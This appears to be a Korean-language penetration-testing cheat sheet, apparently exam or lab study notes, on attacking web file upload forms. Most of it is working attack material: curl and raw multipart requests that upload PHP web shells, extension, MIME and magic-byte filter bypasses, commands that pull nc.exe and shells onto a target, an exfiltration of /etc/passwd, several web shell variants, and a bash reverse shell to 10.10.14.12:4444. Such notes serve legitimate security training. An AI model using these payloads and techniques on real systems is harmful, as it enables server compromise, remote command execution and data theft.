# 파일 업로드/다운로드 기법

## curl로 웹 업로드

```bash
# 기본 파일 업로드 (@는 로컬파일 지정자)
curl -F "file=@shell.php" http://target.com/upload.php
curl -F "fileToUpload=@shell.php" http://target.com/upload.php

# 디버그 모드
curl -v -F "file=@shell.php" http://target.com/upload.php

# 필드 여러개 보내기
curl -F "file=@shell.php" -F "submit=Upload" http://target.com/upload.php

# 우회 기법
curl -F "file=@shell.php;filename=shell.jpg" http://target.com/upload.php  # 파일명 변경
curl -F "file=@shell.php;type=image/jpeg" http://target.com/upload.php     # MIME 타입 변경
curl -F "file=@shell.php" -F "MAX_FILE_SIZE=10000000" http://target.com/upload.php # 파일크기 제한 우회
```

## HTTP 멀티파트 요청 수동 작성 (Burp Suite)

```
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----ABC123
Content-Length: 235

------ABC123
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------ABC123--
```

## 파일 전송 방법

### 방법1: 웹서버 + wget/curl

```bash
# 공격자 PC에서 웹서버 실행
cd /path/to/files
python3 -m http.server 8000
python2 -m SimpleHTTPServer 8000
php -S 0.0.0.0:8000

# 타겟에서 다운로드
wget http://10.10.14.x/shell.php
curl -O http://10.10.14.x/shell.php
wget http://10.10.14.x/shell.php -O /tmp/shell.php  # 경로 지정

# Windows에서
certutil -urlcache -f http://10.10.14.x/nc.exe nc.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.x/nc.exe', 'nc.exe')"
powershell wget http://10.10.14.x/nc.exe -OutFile nc.exe
```

### 방법2: SCP/SFTP (SSH 가능할 때)

```bash
# 내 PC → 타겟
scp shell.php user@10.10.10.x:/tmp/
scp -P 2222 shell.php user@10.10.10.x:/var/www/

# 타겟 → 내 PC
scp user@10.10.10.x:/etc/passwd ./
```

### 방법3: Netcat

```bash
# 수신측(타겟)
nc -lvnp 4444 > shell.php

# 송신측(공격자)
nc 10.10.10.x 4444 < shell.php

# 바이너리는 압축해서
# 송신측
tar -cf - shell.bin | nc 10.10.10.x 4444
# 수신측
nc -lvnp 4444 | tar -xf -
```

### 방법4: Base64 활용

```bash
# 1. 공격자 PC에서 인코딩
base64 -w 0 shell.php

# 2. 타겟에서 디코딩
echo "base64문자열..." | base64 -d > shell.php
```

```

## 업로드 필터 우회 기법 (시험에서 자주 나옴!)

### 1. 확장자 필터링 우회

```

# 시도해볼 트릭 목록

shell.php → shell.php.jpg (이중 확장자)
shell.php → shell.pHp (대소문자)
shell.php → shell.phtml (대체 확장자)
shell.php → shell.PHP5 (다른 버전)
shell.php → shell.php. (점 추가)
shell.php → "shell.php " (공백 추가)
shell.php → shell.php;.jpg (세미콜론)
shell.php → shell.ph\x70 (16진수 인코딩)

# 널바이트 삽입 (PHP 5.3.4 미만)

shell.php → shell.php%00.jpg

```

### 2. MIME 타입 변조 (Burp에서 변경)

```

# 원래 값

Content-Type: application/x-php

# 변경할 값 (이미지처럼 속이기)

Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif

````

### 3. 매직바이트/시그니처 속이기

```bash
# GIF 파일 헤더 추가한 웹쉘
echo 'GIF89a;<?php system($_GET["cmd"]); ?>' > shell.gif

# JPEG 헤더 추가
printf "\xFF\xD8\xFF\xE0" > header.jpg
cat header.jpg shell.php > shell.jpg.php

# 이미지에 PHP 코드 숨기기
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg
````

### 4. 클라이언트 측 검사 우회

```
# 방법1: F12 개발자도구로 JS 비활성화
# 방법2: 폼 제출 직전에 Burp로 가로채서 파일 내용/이름 변경
# 방법3: HTML 편집해서 accept=".jpg,.png,.gif" 속성 제거
```

## 업로드 성공 후 파일 접근 및 테스트

```
# 일반적인 업로드 경로 추측
http://10.10.10.10/uploads/shell.php
http://10.10.10.10/images/shell.php
http://10.10.10.10/upload/shell.php
http://10.10.10.10/files/shell.php

# 명령 실행 테스트
http://10.10.10.10/uploads/shell.php?cmd=id
http://10.10.10.10/uploads/shell.php?0=id
http://10.10.10.10/uploads/shell.jpg.php%00?cmd=whoami

# dirb/gobuster로 업로드 폴더 찾기
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

## 자주 쓰는 웹쉘 코드 (콘텐츠 필터링 우회용)

```php
// 1. 기본 웹쉘
<?php system($_GET['cmd']); ?>

// 2. 백틱 사용 (alternative)
<?php echo `$_GET[0]`; ?>

// 3. 함수명 필터링 우회
<?php $_GET['f']($_GET['c']); ?>
// 사용법: ?f=system&c=id

// 4. 인코딩 우회
<?php eval(base64_decode($_REQUEST[1])); ?>
// 사용법: ?1=c3lzdGVtKCdpZCcp

// 5. 파일 포함
<?php include($_GET["file"]); ?>
// 사용법: ?file=/etc/passwd

// 6. 리버스 쉘 원라이너
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/4444 0>&1'"); ?>
```

## 내가 많이 쓰는 파일 업로드 공격 패턴

1. 파일 업로드 폼 찾기
2. 기본 PHP 파일 시도 (system/exec 함수)
3. 업로드 실패시 확장자 검사 우회 (.php.jpg, .phtml 등)
4. 확장자 성공해도 내용 필터링시 매직바이트 추가
5. BurpSuite로 Content-Type 변조 시도
6. 클라이언트측 검증 우회 (JS 비활성화)
7. 성공 후 쉘 접속해서 권한상승 시도

## 파일 업로드 취약점 자주 발견되는 곳

- 프로필 이미지 업로드 기능
- 첨부파일 업로드
- 관리자 페이지 백업 기능
- 제품/카탈로그 이미지 업로드
- 이력서/문서 제출 폼
- 댓글에 이미지 첨부 기능
